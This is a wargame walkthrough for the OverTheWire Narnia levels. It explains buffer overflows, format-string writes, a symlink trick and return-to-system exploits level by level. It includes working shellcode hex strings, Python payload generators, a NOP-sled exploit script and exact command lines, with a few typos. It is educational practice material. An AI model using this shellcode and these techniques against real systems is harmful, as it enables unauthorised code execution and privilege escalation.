narnia 0 - 
	shows the basic idea of an overflow.
	We can check the c code for the challenge and it shows a buffer of length 20 and a variable val which is set to 0x41414141.
	The goal is to get val to = 0xdeadbeef, and if we do that, then we get a shell to grab the pw for narnia1.
	As we can see,
	-
	int main(){
		long val=0x41414141;
		char buf[20];
	-
	
	This means the stack will have 0x41414141 at $ebp-0x8 and our buf will most likely begin at $ebp-0x1c (20 bytes before val)
	The program uses scanf to fill buf with our input allowing 24 bytes (4 bytes beyond our buffer which happen to be where val is located on the stack).
	so we can just put 20 junk characters, then place deadbeef in val and we've got a shell.   Using a cat trick to keep stdin open, we do this to get the next level.
	python -c "print 'B'*20 + '\xad\xde\xef\xbe'" > /tmp/pwoer/solve.txt
	(cat solve.txt; cat) | ./narnia0
	
	done.
	
narnia 1 - 
	Looking at the code for narnia1 we see that it wants an environment variable "EGG" with something to execute.  It has a function pointer int (*ret)();   which it takes what is in env variable EGG and runs it as a function so we should put shellcode in EGG. 
	export EGG=$(python -c "print '\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81'")
	
	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
	./narnia1 
	now we have a shell for narnia2 and can cat the pw
	
narnia 2 - 
	looking at the code,
	we have a buffer of 128 bytes with an unbounded strcpy from arg1 into the buffer.
	Basic overflow, no aslr, no protections.  We can probably overflow the buffer and check if we can put shellcode in the buffer before eip and jump to it.
	
	Trying to do a breakdown of the stack.. 
	our buffer will be at $ebp-0x80 (128 bytes before ebp) followed on the stack by ebp, ret address, which will put our overwrite of the ret address at 132 bytes.
	python -c "print 'A'*132 + 'B'*4"
	checking the environment after hitting the segfault. EIP is 0x42424242 but our buffer isnt anywhere to be found.  We can use an environment variable, set it to shellcode and overwrite EIP with the address of that string.
	same as narnia1 export EGG with that shell spawning shellcode.  Use gdb to get the address of the EGG env variable string.  Be sure to add 4 to it because your address starts at EGG= and you need to start after the =.
	Env variables change based on the filename that is run, so use the same filename if you've copied it to a tmp folder.  
	done.
	
narnia 3 - 
	this file takes user input for a filename to copy into /dev/null
	Looks like an overflow at 32 characters from the input filename into the filename to replace /dev/null
	we can make a symbolic link to the password file
	mkdir /tmp/pwoer3/tmp/
	cd /tmp/pwoer3/tmp/
	ln -s /etc/narnia_pass/narnia4 sol
	this creates /tmp/pwoer3/tmp/sol  and we create a file and make it accessible to everyone at /tmp/sol
	our input file will read the entirity of the string until the null byte (/tmp/pwoer3/tmp/sol) and the overflow will overwrite the output filename with /tmp/sol.  
	we need to make the first buffer a length of 32 so that our overflow is where we want it to be..
	we can just repeat the first / as many times as we want to make our string the proper length.
	//////////////////////tmp/pwoer3    /tmp/sol
	this is 32 chars                     this is the overflow into output filename
	./narnia3 //////////////////////tmp/pwoer3/tmp/sol
	done
	
narnia 4 - 
	basic overflow where it overwrites all the environment variables with null bytes so we can't use an env variable for shellcode.
	Since this is beginner and there are no protections, we can just jump back in the stack on a hardcoded address with a nopsled.
	eip overwrite is at 264 bytes. 
	confirm overwrite and check stack address of our landing spot
	python -c "print 'A'*264+'B'4"
	our buffer of A's starts at 0xffffd464
	lets give it a bit of space for landing, put a 40 byte nop sled and overwrite EIP with it.
	---
	shellcode = '\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81'
	payload = ''
	payload += '\x90'*40
	payload += shellcode
	payload += '\x90'*(264-40-len(shellcode))
	payload += '\xa0\xd4\xff\xff'  # eip overwrite 0xffffd464

	print payload
	---
	
	i initially ran it with an EIP overwrite of 0xffffd480   this wasn't far enough when i ran the original version (i had copied a version to my tmp folder)
	
	checked the starting point in gdb with the original and we got a starting point at 0xffffd494, gave it a little wiggle room and ended up using 0xffffd4a0.  
	./narnia4 $(python /tmp/pwoer4/exploit.py)
	done.
	
narnia 5 -
	format string vulnerability
	the first %x is where we have control. 
	if we input 
	./narnia5 "AAAA %x" -> the buffer prints 0x41414141
	so we can write to where we want with that first x.  if we replace that with %n, then it writes to the address we place in the string.  i is at ffffd660 and we need to place a %x before %n so we can pad it to create our number to write.
	./narnia5 "AAAA '\x60\xd6\xff\xff' %492x%n
	the %x is 492 because we want it to equal 500,  500 - the 4 a's and the 4 bytes of the address = 492.
	-=--
	import struct
	import os

	payload = 'AAAA'
	payload += struct.pack('I', 0xffffd670)
	payload += '%492x%n'
	print payload
	#os.system('/narnia/narnia5 ' + payload)
	----
	
	done
	
narnia 6 - 
	this is set up with 2 parameters passed in to program
	there is a function pointer declared after the two length 8 char arrays.  
	Env vars are cleared out.  strcpy is used to copy the args (b1 b2) into the char arrays (no bounds.. overflow possible)
	it turns out the function pointer is called with b2 as its arg.
	On the stack we have b2 at $ebp-0x1c b1 at $ebp-0x14 and the fp at $ebp-0xc.. which means, we can overflow b1 into the function pointer, have it call something with b1 as its argument.  
	We will have to play around with how to plan this since we have to overflow and use the null terminators to our advantage.
	The solution is..
	overflow b1 with A*8 followed by the address of system.
	Then since we don't want b1 to contain all the extra values that we used to overflow into fp.. we can overflow b2 into b1 and replace it with /bin/sh (and the null byte termination will get rid of the previous overflow bytes)
	So, we have ./narnia6 AAAAAAAA<addr to system> AAAAAAAA/bin/sh
	That leave the function pointer calling -> system('/bin/sh')
	done.
	
narnia 7 -
	this is another format string vulnerability.
	There is no output of the format string so we have to debug each time to grab what it's writing.
	turns out we can see our value at the second %x in our input.
	AAAA%x%x shows us 0x41414141 at the second dword of our output.
	so then we can see if we can read from there.  our output gives us the pointer addresses for the functions good and hacked.
	then tells us the address of the fp that is used to make the call.
	lets take the address of that function pointer and try to get it's value printed out.
	<value of fp>%x%x 
	We see the proper good function value printed out where we expected.. this is what we want to see.
	Next we try to write to that location.  change that 2nd %x to %n and we need to modify our bytes written so that it is equal to the hacked function's address.
	we can use the padding of the first %x to add length to our string.
	<addr of fp>%134514468x%n  this ends up overshooting our targeted written address by 5 bytes.. because I didn't count for the bytes i was writing myself...  so change it to..
	./narnia7 <addr of fp>%134514463x%n 
	success!
	
narnia 8 - 
	so this challenge has an overflow but instead of a typical library function call, it has a function that runs a while loop that copies characters from argv[1] into the target buffer (length 20)
	
	had trouble realizing that the pointer to the argv[1] location was immediately after our target buffer.. and it shifts based on however many characters passed 20 you put in argv[1]..
	so you have to overwrite the address of argv[1] correctly, then continue the overflow to overwrite EIP.  I returned to system and pushed /bin/sh to the stack as an arg for it..
	so the solution is 
	narnia9 A*20<addr of argv[1]>JUNK<addr of system>JUNK<addr of binsh>     since this ends up being a total of 20 characters passed the initial 20 A's, we need to get the addr of the buffer and subtract 20 from it.
	Luckily an easy automation solution.. 
	If you input 20 A's, the program leaks the address of the buffer in the output..
	using pwntools, we send 20 A's, capture the address, do the calculations, rebuild the buffer with all the proper addresses, rerun with the new payload.. and shell.
	
narnia 9 - 
	CONGRATS
